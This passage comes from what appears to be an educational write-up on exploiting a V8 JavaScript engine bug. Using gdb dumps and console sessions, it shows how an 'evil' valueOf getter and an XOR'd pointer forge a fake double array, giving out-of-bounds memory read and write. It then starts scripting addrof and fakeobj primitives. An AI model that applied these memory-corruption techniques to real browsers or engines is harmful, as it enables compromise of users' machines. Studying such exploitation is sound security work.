In this example I made an array, used DebugPrint to see it's address, and then used gdb's `x/8xg`[^3] command to see the memory around that address. Going forward I'll be cleaning up the examples shown in the blog post, but this is essentially how you can follow along at home.

<!-- todo: i don't think that's quite true -->
You'll notice I subtracted 1 from the memory address before viewing it - that's because of tagged pointers! ~~In a `PACKED_ELEMENTS` array, doubles that~~ end with a 0 bit (even) are stored as-is, but everything ending with a 1 bit (odd) gets interpreted as a pointer, so a pointer to `0x1000` gets stored as `0x1001`. Because of this, we have to subtract 1 from all tagged pointers before checking out their address.

<!-- Anyways, what are those exploit primitives? `addrof` lets us see the memory address of any object, and `fakeobj` lets us create a "fake" JavaScript object - they're almost like memory read and write functions, but not quite. -->

But let's try to understand what the gdb output above means:

<div class="jsMem">
	<div class="jsMemTitle">V8<div class="jsMemSep"></div></div>
	<div class="jsMemDbg">DebugPrint: <span class="jsMemVar1">0xa3800042be9</span>: [JSArray]
- map: <span class="jsMemVar3">0x0a38001cb7c5</span> &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
- prototype: 0x0a38001cb11d &lt;JSArray[0]&gt;
- elements: <span class="jsMemVar5">0x0a3800042bc9</span> &lt;<span class="jsMemVar7">FixedDoubleArray</span>[<span class="jsMemVar6">3</span>]&gt; [PACKED_DOUBLE_ELEMENTS]
- length: <span class="jsMemVar4">3</span>
- properties: <span class="jsMemVar2">0x0a3800000725</span> &lt;FixedArray[0]&gt;
- All own properties (excluding elements): {
   0xa3800000d99: [String] in ReadOnlySpace: #length: 0x0a3800025f85 &lt;AccessorInfo name= 0x0a3800000d99 &lt;String[6]: #length&gt;, data= 0x0a3800000069 &lt;undefined&gt&gt; (const accessor descriptor, attrs: [W__]), location: descriptor
}
- elements: <span class="jsMemVar5">0x0a3800042bc9</span> &lt;FixedDoubleArray[<span class="jsMemVar6">3</span>]&gt; {
          0: <span class="jsMemVar8">1.1</span>
          1: <span class="jsMemVar9">2.2</span>
          2: <span class="jsMemVar10">3.3</span>
}</div>
<div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
	<div class="jsMemHex">0xa3800042bb8: 0x00000004000005e5<span class="under430"><br>0xa3800042bc0:</span> 0x001d3377020801a4
<span class="jsMemVar5">0xa3800042bc8</span>: 0x<span class="jsMemVar6">00000006</span><span class="jsMemVar7">000008a9</span><span class="under430"><br>0xa3800042bd0:</span> 0x<span class="jsMemVar8">3ff199999999999a</span>
0xa3800042bd8: 0x<span class="jsMemVar9">400199999999999a</span><span class="under430"><br>0xa3800042be0:</span> 0x<span class="jsMemVar10">400a666666666666</span>
<span class="jsMemVar1">0xa3800042be8</span>: 0x<span class="jsMemVar2">00000725</span><span class="jsMemVar3">001cb7c5</span><span class="under430"><br>0xa3800042bf0:</span> 0x<span class="jsMemVar4">00000006</span><span class="jsMemVar5">00042bc9</span>
0xa3800042bf8: 0x00bab9320000010d<span class="under430"><br>0xa3800042c00:</span> 0x7566280a00000adc
</div>
<div class="jsMemTitle">ENG<div class="jsMemSep"></div></div>
<div class="jsMemLegend">
The array is at <span class="jsMemVar1">0xa3800042be8</span>, its <span class="jsMemVar2">properties list</span> is empty, it's a <code><span class="jsMemVar3">PACKED_DOUBLE_ELEMENTS</span></code> array with a <span class="jsMemVar4">length of 3</span><sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref" style="color:#95dcff">4</a></sup> at <span class="jsMemVar5">0xa3800042bc9</span>. At that address we find a <span class="jsMemVar7">FixedDoubleArray</span> with a <span class="jsMemVar6">length of 3 (again)</span> and the doubles <span class="jsMemVar8">1.1</span>, <span class="jsMemVar9">2.2</span>, and <span class="jsMemVar10">3.3</span>.
</div>
</div>

<span style="display: none">[^4]</span>

Try <span class="fineText">hovering over</span><span class="coarseText">tapping on</span> the text and stuff above. You'll see what the memory values mean and how they're represented in the %DebugPrint output.

You may be wondering why the memory only contains half the address - `0xa3800042bc8` is stored as `0x00042bc9` for example. This is [V8's pointer compression](https://v8.dev/blog/pointer-compression) and for our purposes all it does is make pointers be just the lower 32 bits of an address.

Pretty cool, let's see what happens if we put an array inside of another array:

<!-- arr = [1.1, 2.2, 3.3]; arr2 = [arr] -->
<div class="jsConsole" style="margin-bottom: 4px;">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr2</span> = [<span class="jsConVar">arr</span>]</div>
</div>
<div class="jsMem">
	<div class="jsMemTitle">V8<div class="jsMemSep"></div></div>
	<div class="jsMemDbg">DebugPrint: 0xa3800044a31: [JSArray]
 - map: 0x0a38001cb845 &lt;Map[16](PACKED_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x0a38001cb11d &lt;JSArray[0]&gt;
 - elements: 0x0a3800044a25 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS]
 - length: 1
 - properties: 0x0a3800000725 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {
    0xa3800000d99: [String] in ReadOnlySpace: #length: 0x0a3800025f85 &lt;AccessorInfo name= 0x0a3800000d99 &lt;String[6]: #length&gt;, data= 0x0a3800000069 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x0a3800044a25 &lt;FixedArray[1]&gt; {
           0: 0x0a3800042be9 &lt;JSArray[3]&gt;
 }</div>
<div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
	<div class="jsMemHex">0xa3800044a10: 0x000005e5000449f5 0x1d1a6d7400000004
0xa3800044a20: 0x0000056d001d3fb7 0x00042be900000002
0xa3800044a30: 0x00000725001cb845 0x0000000200044a25
0xa3800044a40: 0x00000725001cb845 0x0000000200044b99</div>
<div class="jsMemTitle">ENG<div class="jsMemSep"></div></div>
<div class="jsMemLegend">
	The PACKED_ELEMENTS array is at 0xa3800044a30, its 1 element is at 0xa3800044a24 in a FixedArray[1] and the element is a pointer to the previous array at 0xa3800042be8.
</div>
</div>

The memory order of the elements part here looks a little odd because it doesn't align with the 64-bit words and we're looking at [little endian](https://en.wikipedia.org/wiki/Endianness) memory. This is a bit counter-intuitive because instead of reading the offset value as `0x0000000011112222 0x3333444400000000` you have to read it as `0x3333444400000000 0x0000000011112222`.

<div class="over640"><span class="fineText">Here's a fun little widget to play around with the concept:

<div class="offsetDemo">
<div class="offsetDemoOverlay"><span>0000000000000000</span>00000000000000000000000000000000<span>0000000000000000</span><br><span>0000000000000000</span>0<span>00000000000000000</span></div>
<div class="offsetDemoLegend"> read bytes as:                <span style="width:0.5ch;display:inline-block"></span>|<br>  if offset by:                <span style="width:0.5ch;display:inline-block"></span>|</div>
<div class="offsetDemoNumbers">1111222233334444<span style="color:#AAA">0000000000000000</span>1111222233334444<br>001122334455667788                drag this -&gt;<span class="offsetDemoHandle"></span></div>
</div>
</span></div>


<style>
.offsetDemo {
	font-size: 16px;
	cursor: default;
	user-select: none;
	font-family: Menlo, Consolas, "Ubuntu Mono", monospace;
	line-height: 1em;
	width: 64ch;
	margin: 0 auto;
	border-radius: 4px;
	border: 1px solid black;
	overflow: hidden;
	position: relative;
	background: #282C34;
	color: #FFF;
}
.offsetDemoLegend {
	white-space: pre;
	color: var(--lyreGold);
	position: absolute;
	pointer-events: none;
}
.offsetDemoOverlay {
	color: #0000;
	position: absolute;
	height: 1em;
	pointer-events: none;
}
.offsetDemoOverlay > span {
	background: #282C34;
}
.offsetDemoHandle {
	background: var(--lyreGold);
	width: 1.5ch;
	height: 12px;
	margin: 2px 0.25ch;
	display: inline-block;
	vertical-align: middle;
	border-radius: 4px;
}
.offsetDemoNumbers {
	white-space: pre;
  overflow: hidden;
  resize: horizontal;
  height: 2.1em;
  width: 64ch;
  min-width: 48ch;
  max-width: 64ch;
  text-wrap: nowrap;
  text-align: right;
}
</style>

The array in our array is just stored as a pointer to that array! At the moment it is pointing at `0xa3800042be8` which has our double array, but if we XOR this pointer to a different address we can make it point to any array or object we want... even if it doesn't "actually" exist!

Let's try to make a new array appear out of thin air. To do that, we have to put something in the memory that *looks* like an array, and then use XOR to point a pointer to it. I'm going to reuse the header of our first array at `0xa3800042be8`, changing the memory addresses to match our new fake array.

<div class="jsMem">
<div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
	<div class="jsMemHex"><span class="over430">0x??????????: 0x????????????????</span><span class="under430">0x??????????:</span> 0x<span class="jsMemVar6">00000100</span><span class="jsMemVar7">000008a9</span></span>
0x??????????: 0x<span class="jsMemVar2">00000725</span><span class="jsMemVar3">001cb7c5</span><span class="under430"><br>0x??????????:</span> 0x<span class="jsMemVar4">00000100</span><span class="jsMemVar5">00042bd1</span>
</div>
<div class="jsMemTitle">ENG<div class="jsMemSep"></div></div>
<div class="jsMemLegend">
Fake <code><span class="jsMemVar3">PACKED_DOUBLE_ELEMENTS</span></code> array with an <span class="jsMemVar2">empty properties list</span>, with <span class="jsMemVar4">128 elements</span> at <span class="jsMemVar5" style="text-wrap: nowrap">0x???00042bd0</span>. At that address we will have a <span class="jsMemVar7">FixedDoubleArray</span> with a <span class="jsMemVar6">length of 128</span>.
</div>
</div>

That looks like a pretty good fake! And the length of 128 elements is a bonus - letting us read and write far more than we should be able to. To put this fake array in the memory, we must first convert it into floats so we can use it within an array. There are many ways to do that, but the easiest method within JavaScript is to share the same **ArrayBuffer** between a **Float64Array** and a **BigUint64Array**.

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">buffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">ArrayBuffer</span>(<span class="jsConValIn">8</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">floatBuffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">Float64Array</span>(<span class="jsConVar">buffer</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">int64Buffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">BigUint64Array</span>(<span class="jsConVar">buffer</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">i2f</span> = 
		(<span class="jsConIdx">i</span>) => {<span style="white-space: pre-wrap">
     <span class="jsConVar">int64Buffer</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i</span>;
     <span class="jsConKw">return</span> <span class="jsConVar0">floatBuffer</span>[<span class="jsConValIn">0</span>];
   }</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">3.881131231533e-311</span></div>
</div>

Pretty easy! You'll notice I appended an `n` to our hex value - this is just to convert it to a [BigInt](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt), which is required for the **BigUint64Array** but also gives us better accuracy in general[^5].

Let's put these values in the array from earlier:

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = <span class="jsConFun">i2f</span>(<span class="jsConValIn">0x00000100000008a9n</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>[<span class="jsConValIn">1</span>] = <span class="jsConFun">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>[<span class="jsConValIn">2</span>] = <span class="jsConFun">i2f</span>(<span class="jsConValIn">0x0000010000042bd1n</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(3) [<span class="jsConValOut">5.432309235825e-312</span>, <span class="jsConValOut">3.881131231533e-311</span>, <span class="jsConValOut">5.432310575454e-312</span>]</i></summary>
<div style="padding-left: 24px">
	<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">0x00000100000008a9</span><br/>
	<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">0x00000725001cb7c5</span><br/>
	<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">0x0000010000042bd1</span><br/>
</div>
	</details></div>
</div>

So our original real array starts at `0xa3800042be8`, and we have our cool new fake array in the memory at `0xa3800042bd8`, so what we can do now is put our *real array* in a third array with the evil getter trick, and then XOR the pointer to make it point to the fake array.

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr3</span> = [<span class="jsConValIn">1.1</span>]</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">evil</span> = {<span style="white-space: pre-wrap">
     <span class="jsConFun">valueOf</span>: () => {
       <span class="jsConVar">arr3</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">arr</span>;
       <span class="jsConKw">const</span> <span class="jsConIdx">realArray</span> = <span class="jsConValIn">0xa3800042be8n</span>;
       <span class="jsConKw">const</span> <span class="jsConIdx">fakeArray</span> = <span class="jsConValIn">0xa3800042bd8n</span>;
       <span class="jsConKw">return</span> <span class="jsConVar">Number</span>(<span class="jsConVar">realArray</span> ^ <span class="jsConVar">fakeArray</span>);
     }
   }</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr3</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">evil</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr3</span>[<span class="jsConValIn">0</span>]</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(128) [<span class="jsConValOut">3.881131231533e-311</span>, <span class="jsConValOut">5.432310575454e-312</span>, <span class="jsConValOut">3.881131231533e-311</span>, <span class="jsConValOut">1.27321098e-313</span>, <span class="jsConValOut">3.8055412126965747e-305</span>, <span class="jsConValOut">3.3267913058887005e+257</span>, <span class="jsConValOut">2.0317942745751732e-110</span>, <span class="jsConValOut">1.2799112976201688e-152</span>, <span class="jsConValOut">7.632660997817179e-24</span>, <span class="jsConValOut">4.48268017468496e+217</span>, <span class="jsConValOut">2.502521315148532e+262</span>, <span class="jsConValOut">8.764262388001722e+252</span>, <span class="jsConValOut">3.031075143147101e-152</span>, <span class="jsConValOut">5.328171041616219e+233</span>, <span class="jsConValOut">5.5199981093443586e+228</span>, <span class="jsConValOut">7.495112028514905e+247</span>, (112&nbsp;more)...]</i></summary>
<div style="padding-left: 24px">
<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">0x00000725001cb7c5</span><br/>
<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">0x0000010000042bd1</span><br/>
<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">0x00000725001cb7c5</span><br/>
<span class="jsConIdx jsConB">3</span>: <span class="jsConValOut">0x0000000600042bc9</span><br/>
<span class="jsConIdx jsConB">4</span>: <span class="jsConValOut">0x00bab9320000010d</span><br/>
<span class="jsConIdx jsConB">5</span>: <span class="jsConValOut">0x7566280a00000adc</span><br/>
<span class="jsConIdx jsConB">6</span>: <span class="jsConValOut">0x29286e6f6974636e</span><br/>
<span class="jsConIdx jsConB">7</span>: <span class="jsConValOut">0x20657375220a7b20</span><br/>
<span class="jsConIdx jsConB">8</span>: <span class="jsConValOut">0x3b22746369727473</span><br/>
<span class="jsConIdx jsConB">9</span>: <span class="jsConValOut">0x6d2041202f2f0a0a</span><br/>
<span class="jsConIdx jsConB">10</span>: <span class="jsConValOut">0x76696e752065726f</span><br/>
<span class="jsConIdx jsConB">11</span>: <span class="jsConValOut">0x7473206c61737265</span><br/>
<span class="jsConIdx jsConB">12</span>: <span class="jsConValOut">0x20796669676e6972</span><br/>
<span class="jsConIdx jsConB">13</span>: <span class="jsConValOut">0x7075732074616874</span><br/>
<span class="jsConIdx jsConB">14</span>: <span class="jsConValOut">0x6f6d207374726f70</span><br/>
<span class="jsConIdx jsConB">15</span>: <span class="jsConValOut">0x7365707974206572</span><br/>
<span style="padding-left: 4px"><i>(112&nbsp;more)...</i><br/></span>
</div>
	</details></div>
</div>

Wow! That fake array of ours has lots of cool data that we didn't put there. Let's see what it looks like in the memory.

<div class="jsMem">
	<div class="jsMemTitle">V8<div class="jsMemSep"></div></div>
	<div class="jsMemDbg">DebugPrint: <span class="jsMemVar0">0x25ec00042bd9</span>: [JSArray]
 - map: 0x25ec001cb7c5 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x25ec001cb11d &lt;JSArray[0]&gt;
 - elements: <span class="jsMemVar4">0x25ec00042bd1</span> &lt;FixedDoubleArray[128]&gt; [PACKED_DOUBLE_ELEMENTS]
 - length: <span class="jsMemVar3">128</span>
 - properties: 0x25ec00000725 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {
    0x25ec00000d99: [String] in ReadOnlySpace: #length: 0x25ec00025f85 &lt;AccessorInfo name= 0x25ec00000d99 &lt;String[6]: #length&gt;, data= 0x25ec00000069 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: <span class="jsMemVar4">0x25ec00042bd1</span> &lt;FixedDoubleArray[128]&gt; {
           0: <span class="jsMemVar1 jsMemVar2">3.88113e-311</span>
           1: <span class="jsMemVar3 jsMemVar4">5.43231e-312</span>
           2: <span class="jsMemVar7">3.88113e-311</span>
           3: <span class="jsMemVar8">1.27321e-313</span>
           4: <span class="jsMemVar9">3.80554e-305</span>
           5: <span class="jsMemVar10">3.32679e+257</span>
           6: <span class="jsMemVar11">2.03179e-110</span>
           7: <span class="jsMemVar12">1.27991e-152</span>
           8: <span class="jsMemVar13">7.63266e-24</span>
           9: <span class="jsMemVar14">4.48268e+217</span>
          10: <span class="jsMemVar15">2.50252e+262</span>
          11: <span class="jsMemVar16">8.76426e+252</span>
          12: <span class="jsMemVar17">3.03108e-152</span>
          13: <span class="jsMemVar18">5.32817e+233</span>
          14: <span class="jsMemVar19">5.52e+228</span>
          15: <span class="jsMemVar20">7.49511e+247</span>
          ...
}</div>
<div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
	<div class="jsMemHex">0x25ec00042bb8: 0x00000004000005e5 0x001d3377020801a4
<span class="jsMemVar4">0x25ec00042bc8</span>: 0x00000006000008a9 0x<span class="jsMemVar5">00000100</span><span class="jsMemVar6">000008a9</span>
<span class="jsMemVar0">0x25ec00042bd8</span>: 0x<span class="jsMemVar1">00000725</span><span class="jsMemVar2">001cb7c5</span> 0x<span class="jsMemVar4">00000100</span><span class="jsMemVar3">00042bd1</span>
0x25ec00042be8: 0x<span class="jsMemVar7">00000725001cb7c5</span> 0x<span class="jsMemVar8">0000000600042bc9</span>
0x25ec00042bf8: 0x<span class="jsMemVar9">00bab9320000010d</span> 0x<span class="jsMemVar10">7566280a00000adc</span>
0x25ec00042c08: 0x<span class="jsMemVar11">29286e6f6974636e</span> 0x<span class="jsMemVar12">20657375220a7b20</span>
0x25ec00042c18: 0x<span class="jsMemVar13">3b22746369727473</span> 0x<span class="jsMemVar14">6d2041202f2f0a0a</span>
0x25ec00042c28: 0x<span class="jsMemVar15">76696e752065726f</span> 0x<span class="jsMemVar16">7473206c61737265</span>
0x25ec00042c38: 0x<span class="jsMemVar17">20796669676e6972</span> 0x<span class="jsMemVar18">7075732074616874</span>
0x25ec00042c48: 0x<span class="jsMemVar19">6f6d207374726f70</span> 0x<span class="jsMemVar20">7365707974206572</span></div>
<div class="jsMemTitle">ENG<div class="jsMemSep"></div></div>
<div class="jsMemLegend">
</div>
</div>

That's so cool!! It really is just picking up the next 1024 bytes of memory as doubles, letting us see it all by just looking at the array. In fact, we can even see the original `arr` array's header in elements 2 and 3, let's try to read it out from within JavaScript. We'll want a function to turn floats back into hex, for that we can just create the reverse of the `i2f` function from earlier.

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">f2i</span> = 
		(<span class="jsConIdx">f</span>) => {<span style="white-space: pre-wrap">
     <span class="jsConVar">floatBuffer</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">f</span>;
     <span class="jsConKw">return</span> <span class="jsConVar0">int64Buffer</span>[<span class="jsConValIn">0</span>];
   }</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr3</span>[<span class="jsConValIn">0</span>][<span class="jsConValIn">2</span>]</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">3.881131231533e-311</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">f2i</span>(<span class="jsConVar">arr3</span>[<span class="jsConValIn">0</span>][<span class="jsConValIn">2</span>])</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">7855497066437n</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">f2i</span>(<span class="jsConVar">arr3</span>[<span class="jsConValIn">0</span>][<span class="jsConValIn">2</span>]).<span class="jsConFun">toString</span>(<span class="jsConValIn">16</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConStrOut">'725001cb7c5'</span> <span class="jsConNull">// 0x00000725001cb7c5</span></div>
</div>

Exciting! Let's overwrite `arr`'s header with some random stuff and see what happens.

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(3) [<span class="jsConValOut">5.432309235825e-312</span>, <span class="jsConValOut">3.881131231533e-311</span>, <span class="jsConValOut">5.432310575454e-312</span>]</i></summary>
<div style="padding-left: 24px">
	<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">0x00000100000008a9</span><br/>
	<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">0x00000725001cb7c5</span><br/>
	<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">0x0000010000042bd1</span><br/>
</div>
	</details></div>
<div class="jsConBorder"></div>
<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr3</span>[<span class="jsConValIn">0</span>][<span class="jsConValIn">2</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x1337133713371337n</span>)</div>
<div class="jsConBorder"></div>
<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span></div>
<div class="jsConBorder"></div>
<div class="jsConLine" style="white-space: pre-wrap; background: #000; color: #FFF; margin:0; padding: 4px">Received signal 11 SEGV_ACCERR 0a381337133e
==== C stack trace ===============================
 [0x555557b9ea23]
 [0x555557b9e972]
 [0x7ffff7cdae20]
 [0x555556d3190b]
 [0x555557a12ff6]
[end of stack trace]
Segmentation fault (core dumped)</div>
</div>

Whoops, yeah... there's the rub. The memory we're playing with is rather fragile and randomly changing stuff around is going to end up with a crash.

We'll have to be a bit more careful going forward if we want to end up with anything more than a segmentation fault. And there's more to worry about later down the line because v8 also has a garbage collector that likes to swoop in every once in a while to rearrange the memory.

This is a good time to figure out a plan for getting our primitives cooked up though.

## Part 3: Cooking up some primitives

In JavaScript exploitation, a memory corruption is usually turned into the **addrof** and **fakeobj** primitives. **addrof** is a function that tells us the address of a JavaScript object, and **fakeobj** is a function that returns a pointer to a memory address to be interpreted as an object, similar to what we did to create our fake array earlier.

Let's take our research so far and wrap it up in a nice little script.

<div class="jsConsole">
	<div class="jsConCode"><span class="jsConNull">// set up helper stuff</span>
<span class="jsConKw">const</span> <span class="jsConIdx">buffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">ArrayBuffer</span>(<span class="jsConValIn">8</span>);
<span class="jsConKw">const</span> <span class="jsConIdx">floatBuffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">Float64Array</span>(<span class="jsConVar">buffer</span>);
<span class="jsConKw">const</span> <span class="jsConIdx">int64Buffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">BigUint64Array</span>(<span class="jsConVar">buffer</span>);
<!---->
<span class="jsConNull">// bigint to double</span>
<span class="jsConKw">function</span> <span class="jsConIdx">i2f</span>(<span class="jsConIdx">i</span>) {
  <span class="jsConVar">int64Buffer</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i</span>;
  <span class="jsConKw">return</span> <span class="jsConVar">floatBuffer</span>[<span class="jsConValIn">0</span>];
}
<!---->
<span class="jsConNull">// double to bigint</span>
<span class="jsConKw">function</span> <span class="jsConIdx">f2i</span>(<span class="jsConIdx">f</span>) {
  <span class="jsConVar">floatBuffer</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">f</span>;
  <span class="jsConKw">return</span> <span class="jsConVar">int64Buffer</span>[<span class="jsConValIn">0</span>];
}
<!---->
<span class="jsConNull">// bigint to 32-bit hex string</span>
<span class="jsConKw">function</span> <span class="jsConIdx">hex32</span>(<span class="jsConIdx">i</span>) {
  <span class="jsConKw">return</span> <span class="jsConStr">"0x"</span> + <span class="jsConVar">i</span>.<span class="jsConFun">toString</span>(<span class="jsConValIn">16</span>).<span class="jsConFun">padStart</span>(<span class="jsConValIn">8</span>, <span class="jsConValIn">0</span>);
}
<!---->
<span class="jsConNull">// bigint to 64-bit hex string</span>
